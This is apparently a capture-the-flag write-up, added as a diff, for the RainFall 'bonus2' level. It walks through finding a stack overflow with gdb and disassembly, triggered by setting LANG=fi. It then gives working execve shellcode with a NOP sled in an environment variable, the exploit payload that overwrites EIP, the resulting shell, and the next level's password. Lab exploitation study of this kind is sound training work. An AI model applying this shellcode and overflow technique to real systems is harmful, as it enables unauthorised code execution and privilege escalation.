@@ -1,0 +1,126 @@
+# OK OK OK
+./bonus2
+>
+./bonus2 a
+>
+./bonus2 a a
+> hello a
+./bonus2 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa bbbbbbbbbb
+> Hello aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbbbb
+
+# Look like it concat the 2 strings if len(arg1) >= 40
+# We test to break it
+
+(gdb) r aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+Program received signal SIGSEGV, Segmentation fault.
+0x08006241 in ?? ()
+(gdb) i r
+eax            0x4f	79
+ecx            0xffffffff	-1
+edx            0xb7fd28b8	-1208145736
+ebx            0xbffff600	-1073744384
+esp            0xbffff5b0	0xbffff5b0
+ebp            0x39614138	0x39614138 # EBP VALUE MODIFIED OFFSET 26
+esi            0xbffff64c	-1073744308
+edi            0xbffff5fc	-1073744388
+eip            0x8006241	0x8006241
+eflags         0x210282	[ SF IF RF ID ]
+cs             0x73	115
+ss             0x7b	123
+ds             0x7b	123
+es             0x7b	123
+fs             0x0	0
+gs             0x33	51
+
+# Hmmm mb we need to dig more
+
+bonus2@RainFall:~$ objdump -R bonus2
+
+bonus2:     file format elf32-i386
+
+DYNAMIC RELOCATION RECORDS
+OFFSET   TYPE              VALUE
+0804994c R_386_GLOB_DAT    __gmon_start__
+0804995c R_386_JUMP_SLOT   memcmp
+08049960 R_386_JUMP_SLOT   strcat           # The 2 args get concat with the Hello
+08049964 R_386_JUMP_SLOT   getenv           # Witch one ?
+08049968 R_386_JUMP_SLOT   puts             # Puts
+0804996c R_386_JUMP_SLOT   __gmon_start__
+08049970 R_386_JUMP_SLOT   __libc_start_main
+08049974 R_386_JUMP_SLOT   strncpy          # Cpy n char of arg1 and of arg2
+
+# We dig the get env
+
+804859f:	c7 04 24 38 87 04 08 	movl   $0x8048738,(%esp)   | (gdb) x /s 0x8048738:	 "LANG"
+80485a6:	e8 d5 fd ff ff       	call   8048380 <getenv@plt>
+
+LANG=en_US.UTF-8
+
+ 80485c4:	c7 44 24 04 3d 87 04 	movl   $0x804873d,0x4(%esp)
+ 80485cb:	08
+ 80485cc:	8b 84 24 9c 00 00 00 	mov    0x9c(%esp),%eax
+ 80485d3:	89 04 24             	mov    %eax,(%esp)
+ 80485d6:	e8 85 fd ff ff       	call   8048360 <memcmp@plt>
+ 80485db:	85 c0                	test   %eax,%eax
+ 80485dd:	75 0c                	jne    80485eb <main+0xc2>
+ 80485df:	c7 05 88 99 04 08 01 	movl   $0x1,0x8049988
+ 80485e6:	00 00 00
+ 80485e9:	eb 2d                	jmp    8048618 <main+0xef>
+ 
+ # Check 2 first char of env LANG, if fi, language value is 1 (Same for nl and language value is 2)
+ 
+# Then it call greatuser()
+
+ 804848a:	a1 88 99 04 08       	mov    0x8049988,%eax
+ 804848f:	83 f8 01             	cmp    $0x1,%eax
+ 8048492:	74 26                	je     80484ba <greetuser+0x36>
+ 8048494:	83 f8 02             	cmp    $0x2,%eax
+ 8048497:	74 50                	je     80484e9 <greetuser+0x65>
+ 8048499:	85 c0                	test   %eax,%eax
+ 804849b:	75 6d                	jne    804850a <greetuser+0x86>
+ 
+ # Check the value of 0x8049988, then great you in the corresponding language, meaning that the word will take more or less size in the final buffer
+ 
+(gdb) x /s 0x8048710
+0x8048710:	 "Hello "
+(gdb) x /s 0x8048717
+0x8048717:	 "Hyvää päivää "
+
+# Ok we change the language and retest to overflow
+export LANG=fi
+
+(gdb)r aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+Hyvää päivää aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41366141 in ?? () # We have an offset of 18
+
+# Now that we have the control over the eip, we need to inject some shell code
+# We use the env trick to get long string with only 4 char
+
+export SHELLCODE=$(python -c 'print "\x90" * 100 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')
+# Nop sled tech do deal with it easily
+
+# We make a little prog in C to get the env addr
+```
+#include <stdio.h>
+#include <stdlib.h>
+
+int main()
+{
+    char* ptr = getenv("SHELLCODE");
+    printf("%p\n", ptr);
+}
+```
+./a.out
+0xbffff885
+
+# Now we build our payload
+
+./bonus2 $(python -c 'print "a" * 40') $(python -c 'print "a" * 18 + "\x85\xf8\xff\xbf"')
+Hyvää päivää aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa����
+$ whoami
+bonus3
+$ cat /home/user/bonus3/.pass
+71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
+ 
